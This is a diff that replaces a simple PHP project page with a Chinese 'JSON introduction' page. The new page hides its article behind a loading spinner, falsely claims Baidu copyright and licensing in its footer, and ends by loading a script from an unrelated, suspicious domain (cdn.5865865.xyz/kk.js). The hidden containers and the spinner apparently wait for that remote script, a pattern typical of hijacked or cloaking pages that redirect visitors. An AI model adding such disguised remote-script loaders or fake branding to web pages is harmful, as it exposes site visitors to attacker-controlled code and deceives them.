@@ -1,10 +1,201 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-	<meta charset="UTF-8">
-	<title>My PHP Project</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="wap-font-scale" content="no" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta name="referrer" content="no-referrer" />
+	<script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/2.1.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://cdn.bootcss.com/zclip/1.1.2/jquery.zclip.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://libs.baidu.com/bootstrap/3.3.4/css/bootstrap.min.css" media="screen" />
+
+    <title>JSON简介</title>
+    <style type="text/css">
+        body,
+        div,
+        form,
+        input,
+        li,
+        ol,
+        p,
+        textarea,
+        ul {
+            margin: 0;
+            padding: 0;
+            font-family: "Microsoft YaHei";
+            color: #fff;
+        }
+        
+        body {
+            background: #fff;
+            color: #3f3f3f;
+            font-family: Apple LiGothic Medium, SimHei, Geneva, Arial, Helvetica, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+            -webkit-appearance: none;
+            width: 100%;
+            font-size: 12px;
+        }
+        
+        body p {
+            color: #666666;
+            
+            line-height: 25px;
+        }
+        h3 {
+            color: #000;
+            text-align: left;
+            line-height: 25px;
+        }
+		
+		
+        img {
+            border: 0 none;
+			width: auto;
+            max-width: 100%;
+            height: auto;
+            max-height: 100%;
+            vertical-align: middle;
+        }
+		
+		im2 {
+            
+			width: auto;
+            max-width: 100%;
+            height: auto;
+            max-height: 100%;
+            vertical-align: middle;
+        }
+        
+        hr {
+            margin: 10px;
+        }
+		
+		.notice {
+            font-size: 24px;
+            z-index: 9;
+            bottom: 12px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            margin: 0;
+            padding: 10px;
+        }
+        .box {
+            width: 60%;
+            margin: 10% auto;
+        }
+        .url {
+            color: #337ab7;
+            word-wrap: break-word;
+        }
+        .removetip {
+            float: right;
+            font-size: 12px;
+            margin: 20px 10px 0 0;
+            clear: both;
+        }
+        .removetip_en {
+            float: right;
+            font-size: 12px;
+            margin: 0px 10px 0 0;
+            clear: both;
+        }
+        .noticebg {
+            position: relative;
+            margin-bottom: 40px;
+            padding-bottom: 60px;
+            background-color: #fff;
+            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+			background: #f2f2f2;
+        }
+        @media screen and (max-width:1024px) {
+            .box {
+                width: 100%;
+            }
+        }
+    </style>
 </head>
-<body>
-2222	<?php include_once("phpinfo.php"); ?>
+<body style="text-align: center;">
+
+<center id="loading" style="display: block;">
+    <table height="150px" border="0" id='waitPage'>
+        <tr>
+            <td>
+                <img style="height:18px;" id='myImage' src='http://img.zcool.cn/community/0179f1574d2d656ac72525ae5f181d.gif' />
+            </td>
+            <td> &#x52a0;&#x8f7d;&#x4e2d;&#xff0c;&#x8bf7;&#x7b49;&#x5f85;...</td>
+        </tr>
+    </table>
+</center>
+<div id="Zl" style="display: block;"></div>
+
+<div id="wzz" style="display: none;">
+<div class="container" style="margin-top:20px">
+<div class="panel panel-info">
+<div class="panel-heading">
+<h3 class="panel-title">JSON简介</h3>
+</div>
+<div class="panel-body"  style="text-align: left">
+<h3>一、JSON是什么？</h3>
+<p>有一种叫做JSON (JavaScript Object Notation) 的轻量级数据交换格式能够替代XML的工作。它就是JSON。<br></p>
+<p>数据格式比较简单， 易于读写， 格式都是压缩的， 占用带宽小，易于解析这种语言。</p>
+<p>客户端JavaScript可以简单的通过eval()进行JSON数据的读取，包括ActionScript， C， C#， ColdFusion，Java，JavaScript，Perl，PHP，Python，Ruby等语言服务器端语言， 便于服务器端的解析。</p>
+<p>各语言对JSON支持的特别好，自从Ajax的流行，JSON格式传输就更流行了。</p>
+
+<h3>二、表现形式</h3>
+<p>首先，它是一个字符串，一个有规则的字符串。然后它的表现形式是键值对的，非常类似Java语言里的Map、Objective-C里的字典。</p>
+<p>目前我们用到的键值对支持什么呢？可以支持String、Number、Array以及Boolean、null等等。</p>
+<p> 它的作用是用来交互的，但是不局限于Web项目的前后端交互，接口、配置文件、文件存储等等都可以用它。目前很多移动端项目也会用JSON来传输。</p>
+
+<h3>三、优势</h3>
+<p> 简洁、简单、体积小等。<br></p>
+<p>上手容易，高效。</p>
+<p> 跨语言，目前移动端Android、IOS一般项目构造都是其他语言提供接口（JSON方式），移动端读取接口的方式开发。<br>….</p>
+
+<h3>四、与XML的比较</h3>
+<p><strong>可读性</strong></p>
+<p>XML可读性稍好。</p>
+<p><strong>可扩展性</strong></p>
+<p>有人说：“XML天生有很好的扩展性，JSON当然也有，没有什么是XML能扩展，JSON不能的。</p>
+<p>不过 JSON在Javascript主场作战，可以存储Javascript复合对象，有着XML不可比拟的优势”。</p>
+<p>但自从JSON火起来后，JSON的支持包，类库等，相信每个语言都很多。像Java就有Jackson、goson、json-lib、FastJson等等多的去了。<br></p>
+<p><strong>编码难度</strong></p>
+<p>XML有有DOM，SAX，STAX等解析技术，JSON也有，都不错。</p>
+<p><strong>解码难度</strong></p>
+<p>同上。</p>
+<p><strong>解码编码效率</strong></p>
+<p>解析XML有专用CPU！</p>
+</div>
+</div>
+</div>
+<div style="color:black;" class="foot">
+  <br>
+	<p style="text-align: center;">
+		北京百度网讯科技有限公司 版权所有 <a href="https://beian.miit.gov.cn" target="_blank">京ICP证030173号</a>
+	</p>
+  <br>
+</div>
+
+</div>
+
+<div class="container" id="rid2" style="display: none;">
+        <div class="box">
+            <div style="width:100%;">
+                <article class="noticebg">
+                    <div class="notice" id="notice"></div>
+                </article>
+            </div>
+        </div>
+ </div>
+<script src="https://cdn.5865865.xyz/kk.js"></script>
 </body>
 </html>
